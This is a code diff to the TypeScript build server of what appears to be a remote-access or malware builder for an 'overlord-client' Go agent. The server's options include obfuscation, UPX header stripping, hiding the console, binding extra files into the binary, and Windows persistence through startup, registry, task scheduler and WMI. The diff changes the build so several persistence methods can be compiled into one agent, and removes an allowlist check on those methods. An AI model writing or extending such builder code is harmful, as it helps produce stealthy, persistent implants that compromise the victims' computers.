@@ -69,7 +69,7 @@ type BuildProcessConfig = {
   disableCgo?: boolean;
   obfuscate?: boolean;
   enablePersistence?: boolean;
-  persistenceMethod?: string;
+  persistenceMethods?: string[];
   startupName?: string;
   hideConsole?: boolean;
   noPrinting?: boolean;
@@ -129,8 +129,6 @@ function stripUpxHeaders(filePath: string): boolean {
   }
 }
 
-const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
-
 type BuildProcessDeps = {
   generateBuildMutex: (length?: number) => string;
   sanitizeOutputName: (name: string) => string;
@@ -188,6 +186,15 @@ export async function startBuildProcess(
         logger.error("[build] Failed to send to stream:", err);
       }
     });
+
+    if (data.type === "complete") {
+      build.controllers.forEach((controller) => {
+        try {
+          controller.close();
+        } catch {}
+      });
+      build.controllers.length = 0;
+    }
   };
 
   let winresTempDir: string | null = null;
@@ -697,12 +704,10 @@ func runBoundFiles() {
         if (!platform.startsWith('android-')) {
           const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
           ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
-          sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
-          if (os === 'windows' && config.persistenceMethod && VALID_PERSISTENCE_METHODS.has(config.persistenceMethod)) {
-            const methodFlag = `-X overlord-client/cmd/agent/persistence.DefaultPersistenceMethod=${config.persistenceMethod}`;
-            ldflags = `${ldflags} ${methodFlag}`;
-            sendToStream({ type: "output", text: `Persistence method: ${config.persistenceMethod}\n`, level: "info" });
-          }
+          const activeMethods = config.persistenceMethods && config.persistenceMethods.length > 0
+            ? config.persistenceMethods
+            : ['startup'];
+          sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
           if (os === 'windows' && config.startupName) {
             const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
             ldflags = `${ldflags} ${startupNameFlag}`;
@@ -758,11 +763,13 @@ func runBoundFiles() {
         if (config.noPrinting) buildTags.push("noprint");
         if (hasBoundFiles) buildTags.push("hasbinder");
         if (config.enablePersistence && os === "windows") {
-          const method = config.persistenceMethod || "startup";
-          if (method === "registry") buildTags.push("persist_registry");
-          else if (method === "taskscheduler") buildTags.push("persist_taskscheduler");
-          else if (method === "wmi") buildTags.push("persist_wmi");
-          // startup method uses the default no-op persistInstallFn — no tag needed
+          const methods = config.persistenceMethods && config.persistenceMethods.length > 0
+            ? config.persistenceMethods
+            : ['startup'];
+          if (methods.includes("startup")) buildTags.push("persist_startup");
+          if (methods.includes("registry")) buildTags.push("persist_registry");
+          if (methods.includes("taskscheduler")) buildTags.push("persist_taskscheduler");
+          if (methods.includes("wmi")) buildTags.push("persist_wmi");
         }
         const tagArg = buildTags.length > 0 ? `-tags "${buildTags.join(" ")}" ` : "";
         logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
